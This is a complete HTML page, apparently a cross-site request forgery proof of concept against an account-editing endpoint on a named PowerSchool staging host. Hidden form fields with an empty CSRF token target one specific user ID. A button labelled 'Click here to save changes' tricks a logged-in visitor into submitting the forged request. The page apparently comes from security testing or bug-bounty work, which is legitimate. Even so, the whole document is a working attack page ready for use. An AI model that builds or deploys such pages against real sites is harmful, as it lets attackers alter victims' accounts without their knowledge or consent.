<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>CSRF PoC - Click to Submit</title>
</head>
<body>
  <h1>Click the button below</h1>
  <form id="csrfForm" action="https://staged.atenterprise.powerschool.com/ats/account_info?op=edit&USER_ID=ATEAPP3702" method="POST">
    <input type="hidden" name="is_changed" value="true" />
    <input type="hidden" name="CSRF_TOKEN" value="" />
    <input type="hidden" name="EMAIL_OPTED_OUT" value="N" />
    <input type="hidden" name="submit_button" value="Save and Next" />
    <input type="hidden" name="redirect" value="/ats/account_info_success?op=edit&USER_ID=ATEAPP3702&refresh=Y" />
    <input type="hidden" name="op" value="edit" />
    <input type="hidden" name="USER_ID" value="ATEAPP3702" />
    <button type="submit">Click here to save changes</button>
  </form>
</body>
</html>
